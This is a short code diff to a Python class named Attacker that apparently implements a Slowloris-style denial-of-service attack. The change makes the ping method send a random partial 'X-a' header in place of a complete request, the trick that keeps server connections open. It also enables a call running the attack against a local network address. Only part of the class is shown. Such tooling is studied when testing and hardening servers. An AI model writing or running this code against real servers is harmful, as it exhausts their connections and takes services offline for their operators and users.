@@ -75,10 +75,12 @@ class Attacker:
     def ping(self):
 
         request = "GET / HTTP/1.0\r\n\r\n"
-        self.loris.send(request.encode())
+        self.loris.send("X-a: {}\r\n".format(random.randint(1,1000)).encode("utf-8"))
 
         info = self.loris.recv(1000000)
 
         print(info.decode("utf-8"))
 
-#test = Attacker("192.168.0.243")
+test = Attacker("192.168.0.243")
+test.createSocket()
+test.ping()
